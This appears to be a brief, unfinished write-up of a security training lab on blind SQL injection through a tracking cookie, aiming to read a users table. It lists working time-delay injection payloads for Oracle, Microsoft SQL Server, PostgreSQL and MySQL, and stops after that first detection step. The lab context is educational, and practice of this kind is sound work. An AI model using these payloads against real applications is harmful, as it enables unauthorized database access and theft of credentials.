# Lab: Blind SQL injection with time delays and information retrieval
- lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie
- The database contains a different table called users, with columns called username and password
# Goal
- The database contains a different table called users, with columns called username and password
# Solving The Lab
- first thing is to check if the parameter is vulnurable we do that by checking with differnt db time delay function
```
' || (dbms_pipe.receive_message(('a'),10))--   Oracle
' || (WAITFOR DELAY '0:0:10')--                microsoft
' || (SELECT pg_sleep(10))--                   PostgreSQL
' || (SELECT SLEEP(10))--                      MySQL
```
